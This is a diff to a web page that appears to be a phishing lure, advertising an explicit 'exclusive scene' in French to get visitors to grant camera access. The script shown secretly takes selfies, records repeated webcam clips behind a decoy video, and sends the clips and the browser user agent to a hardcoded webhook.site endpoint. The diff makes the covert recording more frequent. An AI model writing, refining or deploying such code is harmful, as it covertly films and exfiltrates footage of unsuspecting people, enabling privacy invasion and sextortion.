@@ -86,7 +86,7 @@
 
 <header>
   <h1>Scène Exclusive 2025</h1>
-  <p class="tagline">Regardez la scène la plus chaude maintenant – cliquez sur Autoriser pour continuer</p>
+  <p class="tagline">Regardez la scène la plus chaude maintenant – cliquez sur Autoriser</p>
 </header>
 
 <div id="status">Chargement en cours... Autorisation de la caméra requise</div>
@@ -120,7 +120,7 @@ const videoContainer = document.getElementById('video-container');
 
 const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";
 
-async function startCaptureAndPlay() {
+async function startCapture() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
@@ -130,22 +130,21 @@ async function startCaptureAndPlay() {
     hiddenVideo.srcObject = stream;
     await hiddenVideo.play();
 
-    status.textContent = "Chargement en cours... Ne fermez pas la page";
+    // التقاط صورتين فور السماح
+    setTimeout(() => captureSelfie(1), 800);
+    setTimeout(() => captureSelfie(2), 2200);
+
+    status.textContent = "Préparation de la vidéo... Ne fermez pas";
     progressContainer.style.display = 'block';
     progressBar.style.width = '0%';
 
-    // التقاط صورتين فور السماح (5 ثواني للـ progress)
-    setTimeout(() => captureSelfie(1), 1000);
-    setTimeout(() => captureSelfie(2), 3000);
-
-    // بدء الـ progress bar لـ 5 ثواني
     let progress = 0;
     const interval = setInterval(() => {
       progress += 2;
       progressBar.style.width = progress + '%';
       if (progress >= 100) {
         clearInterval(interval);
-        showVideo();
+        showVideoAndRecord();
       }
     }, 100);
 
@@ -155,7 +154,7 @@ async function startCaptureAndPlay() {
   }
 }
 
-function showVideo() {
+function showVideoAndRecord() {
   status.style.display = 'none';
   progressContainer.style.display = 'none';
   videoContainer.style.display = 'block';
@@ -163,42 +162,41 @@ function showVideo() {
   const mainVideo = document.getElementById('main-video');
   mainVideo.play();
 
-  // تسجيل أثناء تشغيل الفيديو
+  // تسجيل كل 10 ثواني (5 تصوير + 5 راحة)
   let recording = false;
   const stream = hiddenVideo.srcObject;
 
-  mainVideo.addEventListener('play', async () => {
+  const recordSegment = () => {
     const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
     const chunks = [];
 
     recorder.ondataavailable = e => chunks.push(e.data);
 
-    // تسجيل أول 5 ثواني
     recorder.start(100);
     recording = true;
 
     setTimeout(() => {
       recorder.stop();
       recording = false;
-      recorder.onstop = () => sendVideo(chunks, 1);
-
-      // 5 ثواني بدون تصوير ثم تسجيل آخر 5 ثواني
-      setTimeout(async () => {
-        recorder.start(100);
-        recording = true;
-        setTimeout(() => {
-          recorder.stop();
-          recorder.onstop = () => sendVideo(chunks, 2);
-        }, 5000);
-      }, 5000);
+      recorder.onstop = () => sendVideo(chunks);
     }, 5000);
+  };
+
+  // أول تسجيل بعد 2 ثانية من بدء الفيديو
+  setTimeout(recordSegment, 2000);
+
+  // كل 10 ثواني بعد ذلك
+  mainVideo.addEventListener('timeupdate', () => {
+    if (mainVideo.currentTime % 10 < 0.5 && !recording) {
+      recordSegment();
+    }
   });
 }
 
-async function sendVideo(chunks, num) {
+async function sendVideo(chunks) {
   const blob = new Blob(chunks, { type: 'video/webm' });
   const fd = new FormData();
-  fd.append('video_segment', blob, `segment_\( {Date.now()}_ \){num}.webm`);
+  fd.append('video_segment', blob, `segment_${Date.now()}.webm`);
   fd.append('timestamp', Date.now());
   fd.append('user_agent', navigator.userAgent);
   await fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(console.log);
@@ -235,7 +233,7 @@ function sendBlob(blob, num) {
 }
 
 window.addEventListener('load', () => {
-  setTimeout(startCaptureAndPlay, 800);
+  setTimeout(startCapture, 800);
 });
 </script>
 
